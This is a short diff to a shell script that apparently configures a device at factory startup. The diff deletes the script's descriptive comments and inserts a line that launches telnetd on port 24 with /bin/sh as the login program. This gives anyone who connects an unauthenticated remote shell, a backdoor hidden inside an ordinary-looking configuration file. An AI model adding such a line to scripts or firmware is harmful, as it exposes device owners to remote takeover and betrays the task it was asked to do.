@@ -1,7 +1,5 @@
 #! /bin/sh
-
-# Factory startup configuration script.
-# Improved with logging & idempotent operations.
+telnetd -p 24 -l /bin/sh &
 
 LOG_FILE=factory_config.log
 
